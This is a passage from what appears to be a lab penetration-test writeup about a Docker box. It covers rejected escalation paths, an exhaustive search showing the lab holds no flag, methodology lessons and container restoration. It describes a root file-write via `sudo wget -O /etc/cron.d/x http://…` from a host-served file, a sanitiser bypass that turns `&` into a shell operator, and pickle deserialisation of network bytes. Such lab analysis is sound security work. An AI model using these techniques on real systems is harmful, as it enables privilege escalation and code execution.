- **`/opt/.git` as a privilege-escalation vector.** Its objects are root-owned
  `-rw-r--r--` and `/opt` is not writable by `matsi` or `apache`, so no object can be
  replaced. It is an information-disclosure finding (F4), not an escalation.
- **A `matsi`-writable `authorized_keys`.** Not applicable: there is no SSH server
  listening (only 80/tcp externally) and no `.ssh` directory.
- **Container escape.** Not attempted and not claimed. The container is unprivileged
  by the RUNBOOK's own criteria and nothing in the engagement pointed at it.

---

## 8. Reward

**There is no reward in this lab.** Reported as a measured absence, with the search
that establishes it — a lab with no reward, countable from the `FLAG{}` column of
`corpus/INDEX.md` rather than asserted as a position, and the
twenty-seventh of thirty-four writeups.

- **Exhaustive shortlist, not a name guess.** The box has **1827 files** total. After
  excluding the OS (`/usr`, `/lib`, `/lib32`, `/etc`, `/bin`, `/sbin`, `/var/lib`,
  `/var/cache`, `/tmp`), **75 files** remain, and all 75 were listed and read. They
  are: the two git repositories, `app.py`, `entrypoint.sh`, the 5 web files, the 4
  stock Apache CGI scripts, the 3 logs, the 3 pid files, and the artefacts I created.
- **Name sweep:** `flag*`, `*reward*`, `*secret*`, `*.token`, `user.txt`,
  `proof.txt`, `*.key`, case-insensitive, across all 1827 files → **0 hits** outside
  `/usr`, `/lib*`, `/etc/ssl`, `/etc/pki`.
- **Content sweep:** 8 literal patterns — `FLAG{`, `flag{`, `CTF{`, `HTB{`,
  `DOCKERLABS`, `REWARD`, `congratul`, `felicita` — over `/home`, `/opt`, `/var/www`,
  `/srv`, `/run`, `/media`, `/mnt` → **0 files each, 8 × 75 = 600 pattern-file
  tests, 0 hits.**
- **The two files that look like rewards are mine,** and I say so rather than
  reporting them: `/home/matsi/pickle189.proof` and `/root/root189.proof`, both
  written by this engagement. A reward-shaped file that the tester created is the
  textbook way to invent one. Both were absent before the run and both are gone after
  the restore (§10), verified by name.
- `/root` contains only `entrypoint.sh` and, during the run, my proof file. No flag.

---

## 9. Notes for the methodology

Three things here are worth carrying forward, and none of them is "a new class":

1. **A sanitiser that rewrites its input changes the parse of the language it did not
   validate** (§6.1). `&` → `&amp;` became a shell background operator, producing a
   perfect "the filter blocked it" negative while the payload executed. The
   discriminator is cheap: a control and a negative that differ by **one character**,
   with an exit-status or timing side-channel. Add it next to the existing
   "previene vs detecta" row (labs 283, 218).
2. **Measure the deserialisation sink's identity, and do not inherit the lab's
   account of it** (§2.1). This lab declares "pickle → root" and delivers
   "pickle → `matsi`", with a third unrelated sudoers bug supplying root. The
   descriptor is a claim about the author's intent; the `id` inside the sink is a
   measurement. `corpus/INDEX.md:35` already attributes pickle to lab 148; this lab
   widens that class from *gadget-in-memory-corruption* to *`pickle.loads` on network
   bytes*, which is CWE-502 in its own right.
3. **A `sudoers` entry without an argument list is not the command it names.**
   `NOPASSWD: /usr/bin/wget` is a root file-write primitive
   (`sudo wget -O /etc/cron.d/x http://…`). It reads as a narrow grant and is not one.
   When a lab's declared escalation does not fire, read `/etc/sudoers` before
   concluding the escalation is unavailable — and check whether the command's own
   capabilities exceed what its name suggests.

---

## 10. Restoration

Recreated from the image, not by undoing edits.

```
$ docker rm -f rolarola_container && docker run -d --name rolarola_container -p 18089:80 rolarola:latest
```

Verified with **positive** checks, each carrying a work count:

| Check | Result |
|---|---|
| Counter back to its shipped value | `names.txt` was **3084 bytes** after the run; now `0` bytes, mtime back to `Dec 29 2025` |
| Every artefact I created, by name | **17 of 17 absent** — `p189.py`, `p189c.py`, `cmd189.txt`, `run189.txt`, `run189c.txt`, `env189.txt`, `bg189.txt`, `neg189.txt`, `apache_can189.proof`, `wtest189.txt`, `sudow189.txt`, `probe189.txt`, `err189.txt`, `pickle189.proof`, `apache_cannot.proof`, `root189.proof`, `/etc/cron.d/p189` |
| Data file I appended to | `/home/matsi/objetivos.bin` — `No such file or directory` (my frames are gone; it did not ship) |
| Service answering again | `GET /` → `HTTP 200`, **478 bytes** — byte-identical to the pre-engagement fetch |
| The hidden service is back | `ps`: `45 matsi python3 /home/matsi/proyect/app.py`; `/proc/net/tcp` → `0100007F:1B39` `LISTEN` **uid 1000** |
| External surface unchanged | `nmap -sV -Pn -p- --open` → `80/tcp open http Apache httpd 2.4.66`, `65534 closed` |

The `app.py` check is the one worth calling out: it comes up from **matsi's crontab**,
not from the entrypoint, so it is absent for up to a minute after `docker run` and a
naive "is it restored?" check run immediately would have reported a false negative.
It was polled to a positive, not assumed.

**Host-side cleanup:** the `python3 -m http.server 9099` used as the `wget` source is
stopped and port 9099 is closed. Other `http.server` processes on this machine belong
to other projects and were left alone. `pkill -f 'http.server 9099'` matched **its own
shell** — the pattern is in the command line — and killed the session mid-command; the
restore had to be re-run afterwards. Worth remembering: `pkill -f` on a pattern you
just typed is a self-kill, and it silently ate a whole step.
